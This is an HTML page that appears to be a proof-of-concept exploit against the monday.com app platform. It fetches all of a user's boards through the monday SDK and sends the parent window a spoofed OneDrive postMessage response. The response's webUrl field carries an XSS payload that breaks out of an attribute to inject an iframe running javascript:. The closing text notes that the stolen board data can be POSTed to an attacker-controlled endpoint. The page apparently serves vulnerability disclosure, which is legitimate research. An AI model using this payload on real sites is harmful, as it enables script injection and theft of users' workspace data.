<html>
  <head>
    <script src="https://cdn.jsdelivr.net/npm/monday-sdk-js/dist/main.js"></script>
  </head>
<body>
  <script>
    const monday = window.mondaySdk();
    monday.api(`query {boards { id,name } }`)
      .then(res => {
        const element = document.createElement('pre');
        element.innerHTML = JSON.stringify(res.data, null, 2);
        document.body.appendChild(element);
      })
      .catch(error => {
        alert(error);
      });
    
    window.sendOneDriveMessage = () => {
      window.parent.postMessage({
          is_one_drive_response: true,
          type: 'success',
          response: {
            value: [{
              name: 'Hello!',
              webUrl: "#'><iframe src=javascript:alert(1)></iframe><a href='#"
            }]
          }
        });
    };
  </script>
  <button onclick="window.sendOneDriveMessage()">Send</button>
  Get all boards data.
  After fetching data it can be sent to attacker using POST request to any attacker controlled endpoint:
</body>
</html>
